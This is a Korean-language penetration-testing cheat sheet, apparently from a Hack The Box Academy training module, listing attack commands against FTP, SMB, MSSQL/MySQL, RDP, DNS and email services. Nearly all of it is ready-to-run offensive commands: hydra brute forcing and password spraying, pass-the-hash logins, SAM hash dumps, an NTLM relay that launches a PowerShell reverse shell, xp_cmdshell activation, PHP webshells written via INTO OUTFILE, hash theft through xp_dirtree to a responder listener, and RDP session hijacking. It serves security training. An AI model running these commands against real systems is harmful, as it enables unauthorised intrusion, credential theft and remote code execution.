# 공통 서비스 공격

### FTP 공격



| **명령**                                                                   | **설명**                           |
| ------------------------------------------------------------------------ | -------------------------------- |
| `ftp 192.168.2.142`                                                      | 클라이언트를 사용하여 FTP 서버에 연결합니다 `ftp`. |
| `nc -v 192.168.2.142 21`                                                 | 를 사용하여 FTP 서버에 연결합니다 `netcat`.   |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | FTP 서비스를 무차별 공격합니다.              |

***

### SMB 공격



| **명령**                                                                                                          | **설명**                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `smbclient -N -L //10.129.14.128`                                                                               | SMB 서비스에 대한 널 세션 테스트.                                                                                                          |
| `smbmap -H 10.129.14.128`                                                                                       | 를 사용한 네트워크 공유 열거 `smbmap`.                                                                                                     |
| `smbmap -H 10.129.14.128 -r notes`                                                                              | 를 사용한 재귀적 네트워크 공유 열거 `smbmap`.                                                                                                 |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"`                                                           | 공유 폴더에서 특정 파일을 다운로드합니다.                                                                                                        |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`                                                    | 공유 폴더에 특정 파일을 업로드합니다.                                                                                                          |
| `smbmap -H 172.16.7.50 -u BR086 -p Welcome1 -d inlanefreight.local`                                             | 얻은 자격 증명을 사용하여 원격 서버에 인증하고 공유에 대한 공유 및 권한을 열거합니다. [SMB 공격 - 일반 서비스 공격](https://academy.hackthebox.com/module/116/section/1167) |
| `rpcclient -U'%' 10.10.110.17`                                                                                  | .`rpcclient`​                                                                                                                  |
| `./enum4linux-ng.py 10.10.11.45 -A -C`                                                                          | 를 사용하여 SMB 서비스를 자동으로 열거합니다 `enum4linux-ng`.                                                                                    |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`                                            | 목록의 다른 사용자에게 비밀번호를 분사합니다.                                                                                                      |
| `impacket-psexec administrator:'Password123!'@10.10.110.17`                                                     | 를 사용하여 SMB 서비스에 연결합니다 `impacket-psexec`.                                                                                       |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`            | 를 사용하여 SMB 서비스를 통해 명령을 실행합니다 `crackmapexec`.                                                                                   |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`                           | 로그온한 사용자를 열거합니다.                                                                                                               |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`                                        | SAM 데이터베이스에서 해시를 추출합니다.                                                                                                        |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`                            | Pass-The-Hash 기술을 사용하여 대상 호스트에서 인증합니다.                                                                                         |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`                                            | 를 사용하여 SAM 데이터베이스를 덤프합니다 `impacket-ntlmrelayx`.                                                                                |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | .dll을 사용하여 PowerShell 기반 역방향 셸을 실행합니다 `impacket-ntlmrelayx`.                                                                   |

***

### SQL 데이터베이스 공격



| **명령**                                                                                                                     | **설명**                                                                                                                                                                       |
| -------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mysql -u julio -pPassword123 -h 10.129.20.13`                                                                             | MySQL 서버에 연결 중입니다.                                                                                                                                                           |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`                                                      | MSSQL 서버에 연결 중입니다.                                                                                                                                                           |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`                                                                        | Linux에서 MSSQL 서버에 연결합니다. [공통 서비스와 상호 작용 - 명령줄 유틸리티를 통해 원격으로 데이터베이스와 상호 작용하는 MySQL 및 MSSQL의 일반적인 방법: `mysql`또는`sqsh`](https://academy.hackthebox.com/module/116/section/1140) |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`                                                                     | MSSQL 서버에서 Windows 인증 메커니즘을 사용하는 동안 Linux에서 MSSQL 서버에 연결합니다.                                                                                                                 |
| `mysql> SHOW DATABASES;`                                                                                                   | MySQL에서 사용 가능한 모든 데이터베이스를 표시합니다.                                                                                                                                             |
| `mysql> USE htbusers;`                                                                                                     | MySQL에서 특정 데이터베이스를 선택합니다.                                                                                                                                                    |
| `mysql> SHOW TABLES;`                                                                                                      | MySQL의 선택된 데이터베이스에서 사용 가능한 모든 테이블을 표시합니다.                                                                                                                                    |
| `mysql> SELECT * FROM users;`                                                                                              | MySQL의 "users" 테이블에서 사용 가능한 모든 항목을 선택합니다.                                                                                                                                    |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases`                                                                         | MSSQL에서 사용 가능한 모든 데이터베이스를 표시합니다.                                                                                                                                             |
| `sqlcmd> USE htbusers`                                                                                                     | MSSQL에서 특정 데이터베이스를 선택합니다.                                                                                                                                                    |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`                                                                 | MSSQL에서 선택한 데이터베이스의 사용 가능한 모든 테이블을 표시합니다.                                                                                                                                    |
| `sqlcmd> SELECT * FROM users`                                                                                              | MSSQL의 "users" 테이블에서 사용 가능한 모든 항목을 선택합니다.                                                                                                                                    |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`                                                                  | 고급 옵션을 변경할 수 있도록 합니다.                                                                                                                                                        |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`                                                                            | xp\_cmdshell을 활성화하려면.                                                                                                                                                        |
| `sqlcmd> RECONFIGURE`                                                                                                      | 변경 사항을 적용하기 위해 각 sp\_configure 명령 다음에 사용됩니다.                                                                                                                                 |
| `sqlcmd> xp_cmdshell 'whoami'`                                                                                             | MSSQL 서버에서 시스템 명령을 실행하여 SQL 구문을 통해 원격 대상에서 원격 명령 실행 RCE를 성공적으로 수행할 수 있는지 테스트합니다. [XP\_CMDSHELL - SQL 데이터베이스 공격](https://academy.hackthebox.com/module/116/section/1169)      |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`                           | MySQL을 사용하여 파일을 만듭니다.                                                                                                                                                        |
| `mysql> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "C:\\xampp\\htdocs\\z.php";`                          | XAMPP를 실행하는 Windows 대상에 PHP 웹쉘을 작성합니다.                                                                                                                                       |
| `mysql> show variables like "secure_file_priv";`                                                                           | 시스템에 로컬로 저장된 파일을 읽으려면 보안 파일 권한이 비어 있는지 확인하십시오.                                                                                                                               |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`                 | MSSQL에서 로컬 파일을 읽습니다.                                                                                                                                                         |
| `mysql> select LOAD_FILE("/etc/passwd");`                                                                                  | MySQL에서 로컬 파일을 읽습니다.                                                                                                                                                         |
| `bash> sudo responder -I tun0`                                                                                             | `xp_dirtree`MSSQL의 sqlcmd 명령에서 인증 요청을 수신하려면 인터페이스 tun0에서 응답자를 시작합니다 .                                                                                                        |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`                                                                  | `xp_dirtree`MSSQL의 명령어를 이용한 해시 훔치기 .                                                                                                                                         |
| `DOS> hashcat.exe -a 0 -m 5600 s:\hashes\responder-hashes.txt s:\wordlists\mut_password.list -O'`                          | Hashcat을 사용하여 응답자로부터 얻은 도난당한 NTLMv2 해시를 크랙합니다.                                                                                                                               |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`                                                                  | `xp_subdirs`MSSQL의 명령어를 이용한 해시 훔치기 .                                                                                                                                         |
| `sqlcmd> SELECT srvname, isremote FROM sysservers`                                                                         | MSSQL에서 연결된 서버를 식별합니다.                                                                                                                                                       |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | MSSQL에서 원격 연결에 사용되는 사용자 및 해당 권한을 식별합니다.                                                                                                                                      |

***

### RDP 공격



| **명령**                                                                                               | **설명**                                         |
| ---------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`                                 | RDP 서비스에 대한 비밀번호 스프레이.                         |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`                                          | RDP 서비스를 무차별 공격합니다.                            |
| `rdesktop -u admin -p password123 192.168.2.143`                                                     | Linux를 사용하여 RDP 서비스에 연결합니다 `rdesktop`.         |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`                                               | 비밀번호 없이 사용자를 가장합니다.                            |
| `net start sessionhijack`                                                                            | RDP 세션 하이재킹을 실행합니다.                            |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | 대상 Windows 호스트에서 "제한된 관리 모드"를 활성화합니다.          |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`                           | Pass-The-Hash 기술을 사용하여 비밀번호 없이 대상 호스트에 로그인합니다. |

***

### DNS 공격



| **명령**                                                              | **설명**                             |
| ------------------------------------------------------------------- | ---------------------------------- |
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`                 | 특정 이름 서버에 대해 AXFR 영역 전송 시도를 수행합니다. |
| `subfinder -d inlanefreight.com -v`                                 | 무차별 대입 하위 도메인.                     |
| `./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt` | 지정된 도메인을 다시 하위 도메인으로 검색합니다.        |
| `host support.inlanefreight.com`                                    | 지정된 하위 도메인에 대한 DNS 조회입니다.          |

***

### 이메일 서비스 공격



| **명령**                                                                                                                                                  | **설명**                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `host -t MX microsoft.com`                                                                                                                              | 지정된 도메인의 메일 서버에 대한 DNS 조회입니다.                               |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`                                                                                                  | 지정된 도메인의 메일 서버에 대한 DNS 조회입니다.                               |
| `host -t A mail1.inlanefreight.htb.`                                                                                                                    | 지정된 하위 도메인에 대한 IPv4 주소의 DNS 조회입니다.                          |
| `telnet 10.10.110.20 25`                                                                                                                                | SMTP 서버에 연결합니다.                                             |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`                                                                           | 유효한 사용자 계정을 찾기 위해 지정된 호스트에 대해 RCPT 명령을 사용하는 SMTP 사용자 열거입니다. |
| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                                                              | 지정된 도메인에 대한 Office365 사용을 확인합니다.                            |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                                                                     | 지정된 도메인에서 Office365를 사용하는 기존 사용자를 열거합니다.                    |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`                                         | 지정된 도메인에 대해 Office365를 사용하는 사용자 목록에 대한 암호 스프레이입니다.          |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                                                                               | POP3 서비스를 무차별 공격합니다.                                        |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | 오픈 릴레이 취약점에 대한 SMTP 서비스를 테스트합니다.                            |
